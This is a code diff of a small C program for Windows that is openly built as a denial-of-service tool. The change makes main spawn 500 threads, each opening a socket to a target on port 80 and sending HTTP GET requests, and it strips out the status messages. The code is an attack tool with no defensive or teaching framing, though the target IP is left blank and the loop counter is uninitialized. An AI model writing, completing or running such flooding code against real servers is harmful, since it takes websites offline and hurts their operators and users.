@@ -11,24 +11,35 @@ SOCKET startSocket();
 void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
 void sendMsg(SOCKET client_socket, const char *msg);
 void closeSocket(SOCKET client_socket);
-void attack(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* target_ip);
+DWORD WINAPI attack(LPVOID target_ip);
 
 int main(){
+    const char* target_ip = "";
+    printf("Executing attack...\n");
+    for (int i; i<500; i++){
+        HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)target_ip, 0, NULL);
+        // printf("Thread created");
+        if (attack_thread == NULL){
+            printf("error creating thread \n");
+        }
+    }
+    // attack( target_ip);
+    while (1){
+        ;
+    }
+    return 0;
+}
+
+DWORD WINAPI attack(LPVOID target){
+    const char* target_ip = (const char*) target;
     SOCKET client_socket;
     struct sockaddr_in serv_addr;
     WSADATA wsaData;
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(80);
-    const char* target_ip = "";
-
     startWinsock(&wsaData);
     client_socket = startSocket();
-    attack(&serv_addr, client_socket, target_ip);
-    return 0;
-}
-
-void attack(struct sockaddr_in *serv_addr, SOCKET client_socket, const char* target_ip){
-    connectToServer(serv_addr, client_socket, target_ip);
+    connectToServer(&serv_addr, client_socket, target_ip);
     char msg[64];
     int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
     // printf("%i", sprintf_stat);
@@ -52,9 +63,7 @@ SOCKET startSocket() {
         printf("\n Socket creation error \n");
         WSACleanup();
         exit(EXIT_FAILURE);
-    } else {
-        printf("Socket created. \n");
-    }
+    } 
     return client_socket;
 }
 
@@ -72,9 +81,7 @@ void connectToServer(struct sockaddr_in *serv_addr, SOCKET client_socket, const 
         closesocket(client_socket);
         WSACleanup();
         exit(EXIT_FAILURE);
-    } else{
-        printf("Client connected to server.\n");
-    }
+    } 
 }
 
 // function to send message via socket connection
@@ -82,9 +89,7 @@ void sendMsg(SOCKET client_socket, const char *msg) {
     int sent = send(client_socket, msg, strlen(msg), 0);
     if (sent == -1){
         printf("Error sending message. The connection must have been cut.\n");
-    } else{
-        printf("%s sent, status = %i \n", msg, sent);
-    }
+    } 
 }
 
 // function to close the socket and clean up the resources that are no longer being used
